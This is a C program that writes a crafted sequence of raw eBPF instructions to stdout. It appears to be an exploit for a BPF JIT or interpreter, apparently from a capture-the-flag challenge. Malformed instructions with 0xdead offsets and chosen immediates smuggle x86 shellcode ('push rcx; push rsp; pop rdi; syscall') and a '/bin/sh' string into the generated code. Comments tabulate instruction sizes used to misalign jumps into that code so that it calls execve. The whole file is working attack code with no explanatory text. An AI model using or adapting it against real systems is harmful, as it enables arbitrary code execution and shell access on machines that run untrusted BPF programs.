#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <stdio.h>
#include <stdint.h>

void write_insn(struct bpf_insn insn) {
  fwrite(&insn, sizeof(insn), 1, stdout);
}

int main() {

  const char *binsh = "/bin/sh";

  write_insn((struct bpf_insn) {
    .code = BPF_LD | BPF_IMM | 0x18,
    .dst_reg = 4, // rcx
    .src_reg = 9,
    .off = 0xdead,
    .imm = *(int*)binsh
  });

  fwrite(binsh, 8, 1, stdout);

  write_insn((struct bpf_insn) {
    .code = BPF_ALU | BPF_MOV | BPF_K,
    .dst_reg = 0,
    .src_reg = 0,
    .off = 0xdead,
    .imm = 59 // EXECVE
  });

#define INSNS 7

  write_insn((struct bpf_insn) {
    .code = BPF_JMP | BPF_JSET | BPF_X,
    .dst_reg = 0,
    .src_reg = 0,
    .off = INSNS,
    .imm = 0xc0a1beef
  });

  // BASE = 5
  // DIV_K_NA = 25
  // DIV_K_A  = 22
  // DIV_X_NA = 21
  // DIV_X_A  = 18
  // MUL_K_NA = 18
  // MUL_K_A  = 13
  // MUL_X_NA = 16
  // MUL_X_A  = 11
  // ADD_K_A  = 5
  // ADD_K_R  = 6
  // ADD_K_RR = 7
  // ADD_X_R  = 2
  // ADD_X_RR = 3

  // GAP
  for (int i = 0; i < 4; i++) {
    // DIV_K_NA = 25
    write_insn((struct bpf_insn) {
      .code = BPF_ALU | BPF_DIV | BPF_K,
      .dst_reg = 2,
      .src_reg = 9,
      .off = 0xdead,
      .imm = 0xc0a1beef
    });
  }
  // DIV_X_A  = 18
  write_insn((struct bpf_insn) {
    .code = BPF_ALU | BPF_DIV | BPF_X,
    .dst_reg = 0,
    .src_reg = 9,
    .off = 0xdead,
    .imm = 0xc0a1beef
  });
  // ADD_K_A  = 5
  write_insn((struct bpf_insn) {
    .code = BPF_ALU | BPF_ADD | BPF_K,
    .dst_reg = 0,
    .src_reg = 9,
    .off = 0xdead,
    .imm = 0xc0a1beef
  });

  // JMP ABS
  write_insn((struct bpf_insn) {
    .code = BPF_JMP | BPF_JA | BPF_X,
    .dst_reg = 0,
    .src_reg = 0,
    .off = -INSNS,
    .imm = 0xc0a1beef
  });


  write_insn((struct bpf_insn) {
    .code = BPF_LD | BPF_IMM | 0x18,
    .dst_reg = 0,
    .src_reg = 9,
    .off = 0xdead,
    .imm = 0x54519000 // push rcx; push rsp; pop rdi; syscall
  });

  uint64_t upper = 0xff050f5f00000000;
  fwrite(&upper, sizeof(upper), 1, stdout);

#undef INSNS


// CYCLE 2

#define INSNS 8

  write_insn((struct bpf_insn) {
    .code = BPF_JMP | BPF_JA | BPF_X,
    .dst_reg = 0,
    .src_reg = 0,
    .off = INSNS,
    .imm = 0xc0a1beef
  });


  // GAP
  for (int i = 0; i < 5; i++) {
    // DIV_K_A  = 22
    write_insn((struct bpf_insn) {
      .code = BPF_ALU | BPF_DIV | BPF_K,
      .dst_reg = 0,
      .src_reg = 9,
      .off = 0xdead,
      .imm = 0xc0a1beef
    });
  }
  // ADD_K_A  = 5
  write_insn((struct bpf_insn) {
    .code = BPF_ALU | BPF_ADD | BPF_K,
    .dst_reg = 0,
    .src_reg = 9,
    .off = 0xdead,
    .imm = 0xc0a1beef
  });
  // ADD_K_A  = 5
  write_insn((struct bpf_insn) {
    .code = BPF_ALU | BPF_ADD | BPF_K,
    .dst_reg = 0,
    .src_reg = 9,
    .off = 0xdead,
    .imm = 0xc0a1beef
  });

  write_insn((struct bpf_insn) {
    .code = BPF_JMP | BPF_JEQ | BPF_X,
    .dst_reg = 0,
    .src_reg = 0,
    .off = -INSNS,
    .imm = 0xc0a1beef
  });


  write_insn((struct bpf_insn) {
    .code = BPF_ALU | BPF_ADD | BPF_K,
    .dst_reg = 0,
    .src_reg = 9,
    .off = 0xdead,
    .imm = 0xc0a1beef
  });
#undef  INSNS

}
